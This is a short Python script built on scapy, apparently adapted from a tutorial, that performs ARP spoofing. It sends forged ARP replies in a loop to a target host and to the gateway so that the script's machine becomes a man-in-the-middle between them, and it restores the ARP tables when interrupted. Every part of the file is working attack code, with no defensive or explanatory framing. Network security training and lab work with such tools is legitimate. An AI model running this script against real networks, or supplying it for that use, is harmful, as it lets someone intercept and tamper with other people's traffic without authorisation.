#!venv/bin/python

from scapy.all import *
from scapy.all import Ether, ARP
import settings
"""
Use ARP to fool client and gateway to become MitM

Adapted from https://www.geeksforgeeks.org/
"""

def get_mac(ip):
    arp_request = ARP(pdst = ip)
    broadcast = Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc

  
def spoof(target_ip, spoof_ip):
    packet = ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip),
                                                            psrc = spoof_ip)
    send(packet, verbose = False)
  
  
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    send(packet, verbose = False)
  
try:
    sent_packets_count = 0
    while True:
        spoof(settings.destination_ip, settings.router)
        spoof(settings.router, settings.destination_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
        time.sleep(2) # Waits for two seconds
  
except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(settings.router, settings.destination_ip)
    restore(settings.destination_ip, settings.router)
    print("[+] Arp Spoof Stopped")